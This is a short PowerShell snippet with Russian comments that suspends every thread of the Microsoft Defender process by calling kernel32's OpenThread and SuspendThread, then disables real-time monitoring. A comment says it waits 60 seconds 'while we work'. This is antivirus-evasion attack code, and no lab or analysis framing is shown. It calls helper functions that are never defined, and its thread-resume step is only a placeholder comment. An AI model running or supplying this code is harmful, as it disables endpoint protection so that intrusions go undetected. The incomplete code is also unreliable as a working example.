$defender = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
if ($defender) {
    # Приостанавливаем все потоки Defender
    $defender.Threads | ForEach-Object {
        $threadId = $_.Id
        $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll OpenThread),
            (Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr]))
        ).Invoke(0x0002, $false, $threadId) # THREAD_SUSPEND_RESUME
        
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll SuspendThread),
            (Get-DelegateType @([IntPtr]) ([UInt32]))
        ).Invoke($hThread)
    }
    
    # Отключаем real-time мониторинг
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    
    # Ждем 60 секунд (пока мы работаем)
    Start-Sleep -Seconds 60
    
    # Возобновляем потоки
    $defender.Threads | ForEach-Object {
        # ResumeThread код...
    }
}
